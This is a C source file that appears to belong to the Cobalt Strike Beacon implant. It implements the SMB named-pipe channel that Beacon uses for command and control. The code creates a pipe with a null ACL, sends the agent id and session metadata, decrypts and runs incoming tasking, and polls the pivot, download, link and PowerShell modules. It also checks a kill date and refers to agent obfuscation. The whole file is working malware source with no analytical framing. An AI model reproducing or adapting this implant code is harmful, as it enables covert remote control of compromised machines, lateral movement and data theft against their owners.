/*
 * Manage the SMB data channel for Beacon
 * Entry point:
 *	1. command_link_wait
 *		user requested SMB data channel
 *	2. smb_init 
 *		create our named pipe with a null ACL
 *	3. smb_wait
 *		wait for a connection... send agent id when it comes
 *	4. smb_process
 *		process server data please... do normal beacon stuff.
 */

#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"
#include "linkint.h"
#include "clientint.h"

static LCHANNEL server;

static char * client_write_buffer = NULL;
static int    client_write_len    = 0;
static char * client_read_buffer  = NULL;

extern unsigned int agentid;
extern sessdata bigsession;
extern unsigned int sleep_time;

/*
 *  assume we have a connected client, set everything up, please!
 */ 
void client_init(LCHANNEL channel) {
	char out[256];
	char * optr = out;

	/* alloc our data */
	client_write_buffer = (char *)malloc(MAX_GET); /* TODO buffer cleaned up via client_stop(), clean up on exit */
	client_write_len = 0;

	/* now we can assign the handle */
	server = channel;

	/* copy metadata */
	memcpy(optr, &agentid, sizeof(unsigned int));
	memcpy(optr + sizeof(unsigned int), bigsession.data, bigsession.length);

	/* write out our agent id and metadata */
	LCHANNEL_WRITE_FRAME(server, optr, sizeof(unsigned int) + bigsession.length);
	LCHANNEL_FLUSH(server);
}

/*
 *  clean up our client, thanks!
 */
void client_stop() {
	/* free up some of our data */
	client_write_len = 0;

	/* free our datarz */
	if (client_write_buffer != NULL)
		free(client_write_buffer);

	if (client_read_buffer != NULL)
		free(client_read_buffer);

	client_write_buffer = NULL;
	client_read_buffer  = NULL;
}

/*
 * write data to our named pipe 
 */
void client_write(char * buffer, int len) {
	unsigned int flen = 0;
	int length = 0;
	int mustread = 0;

	/* sanity check to make sure we're not sending an obscenely sized file */
	if ((len + sizeof(unsigned int)) > MAX_GET) {
		/* this message is too big, no way in hell! */
		return;
	}
	/* if we're be too big, go ahead and make a post now */
	else if ((client_write_len + len + sizeof(unsigned int)) > MAX_GET) {
		/* we're too big... sooo.... let's flush */
		client_flush();
		/* we f'd up read/write loop, so let's flag that we need to do a read */
		mustread = 1;
	}

	/* if we're not too big, let's append our length and data */
	flen = htonl(len);
	memcpy((void *)(client_write_buffer + client_write_len), (void *)&flen, sizeof(unsigned int));
	client_write_len += sizeof(unsigned int);

	/* now, let's append our data to post */
	memcpy((void *)(client_write_buffer + client_write_len), buffer, len);
	client_write_len += len;

	/* SMB loop assumes READ, WRITE, READ, etc. - we do a read here to put loop back on track */
	if (mustread == 1) {
		/* wait for data to be available (and obfuscate our agent if gargling is enabled) */
		LCHANNEL_WAIT(server);

		/* read from the connection */
		length = LCHANNEL_READ_FRAME(server, client_read_buffer, MAX_GET);
		if (length > 0) {
			length = security_decrypt(client_read_buffer, length);
			if (length > 0) {
				process_payload(client_read_buffer, length);
			}
		}
	}
}

/*
 * this benefits the TCP Beacon more than anything, but hey...
 */
void client_close() {
	LCHANNEL_FLUSH(server);
	LCHANNEL_CLOSE(server);
}

/* 
 * post our data back
 */
void client_flush() {
	if (client_write_len > 0) {
		LCHANNEL_WRITE_FRAME(server, (char*)client_write_buffer, client_write_len);
	}
	else {
		LCHANNEL_WRITE_FRAME(server, NULL, 0);
	}

	LCHANNEL_FLUSH(server);

	client_write_len = 0;
}

void client_process() {
	int length = 0;

	if (client_read_buffer == NULL)
		client_read_buffer = (char *)malloc(MAX_GET);  /* TODO buffer cleaned up via client_stop(), clean up on exit */

	while (TRUE) {
		/* wait for data to be available (and obfuscate our agent if gargling is enabled) */
		LCHANNEL_WAIT(server);

		/* read from the connection */
		length = LCHANNEL_READ_FRAME(server, client_read_buffer, MAX_GET);
		if (length < 0) {
			return;
		}	

		if (length > 0) {
			length = security_decrypt(client_read_buffer, length);
			if (length > 0) {
				process_payload(client_read_buffer, length);
			}
		}

		pivot_poll(command_shell_callback);
		download_poll(command_shell_callback, MAX_PACKET / 2);
		link_poll(command_shell_callback);
		psh_poll(command_shell_callback, MAX_PACKET);

		/* check the kill date */
		if (check_kill_date())
			command_die(command_shell_callback);

		client_flush();

		if (sleep_time == 0)
			return;
	}
}